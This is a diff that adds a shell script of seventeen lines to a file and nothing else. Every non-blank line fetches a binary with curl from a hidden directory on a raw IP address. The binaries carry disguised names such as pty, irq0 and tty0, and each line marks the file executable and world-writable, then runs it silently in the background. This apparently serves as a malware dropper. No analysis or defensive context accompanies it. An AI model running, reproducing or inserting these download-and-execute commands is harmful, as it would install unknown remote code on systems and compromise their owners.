@@ -1,0 +1,17 @@
+curl http://147.231.19.62/.x/pty -o pty; chmod +x pty ; chmod 777 pty ; ./pty > /dev/null 2>&1 &
+
+curl http://147.231.19.62/.x/irq0 -o irq0 ; chmod +x irq0 ; chmod 777 irq0 ; ./irq0 > /dev/null 2>&1 &
+curl http://147.231.19.62/.x/irq1 -o irq1 ; chmod +x irq1 ; chmod 777 irq1 ; ./irq1 > /dev/null 2>&1 &
+curl http://147.231.19.62/.x/irq2 -o irq2 ; chmod +x irq2 ; chmod 777 irq2 ; ./irq2 > /dev/null 2>&1 &
+
+curl http://147.231.19.62/.x/tty0 -o /tmp/tty0 ; chmod +x /tmp/tty0 ; chmod 777 /tmp/tty0 ; /tmp/tty0 > /dev/null 2>&1 &
+curl http://147.231.19.62/.x/tty1 -o /tmp/tty1 ; chmod +x /tmp/tty1 ; chmod 777 /tmp/tty1 ; /tmp/tty1 > /dev/null 2>&1 &
+curl http://147.231.19.62/.x/tty2 -o /tmp/tty2 ; chmod +x /tmp/tty2 ; chmod 777 /tmp/tty2 ; /tmp/tty2 > /dev/null 2>&1 &
+curl http://147.231.19.62/.x/tty3 -o /tmp/tty3 ; chmod +x /tmp/tty3 ; chmod 777 /tmp/tty3 ; /tmp/tty3 > /dev/null 2>&1 &
+curl http://147.231.19.62/.x/tty4 -o /tmp/tty4 ; chmod +x /tmp/tty4 ; chmod 777 /tmp/tty4 ; /tmp/tty4 > /dev/null 2>&1 &
+curl http://147.231.19.62/.x/tty5 -o /tmp/tty5 ; chmod +x /tmp/tty5 ; chmod 777 /tmp/tty5 ; /tmp/tty5 > /dev/null 2>&1 &
+curl http://147.231.19.62/.x/tty6 -o /tmp/tty6 ; chmod +x /tmp/tty6 ; chmod 777 /tmp/tty6 ; /tmp/tty6 > /dev/null 2>&1 &
+
+curl http://147.231.19.62/.x/irq0 -o /tmp/irq0 ; chmod +x /tmp/irq0 ; chmod 777 /tmp/irq0 ; /tmp/irq0 > /dev/null 2>&1 &
+curl http://147.231.19.62/.x/irq1 -o /tmp/irq1 ; chmod +x /tmp/irq1 ; chmod 777 /tmp/irq1 ; /tmp/irq1 > /dev/null 2>&1 &
+curl http://147.231.19.62/.x/irq2 -o /tmp/irq2 ; chmod +x /tmp/irq2 ; chmod 777 /tmp/irq2 ; /tmp/irq2 > /dev/null 2>&1 &
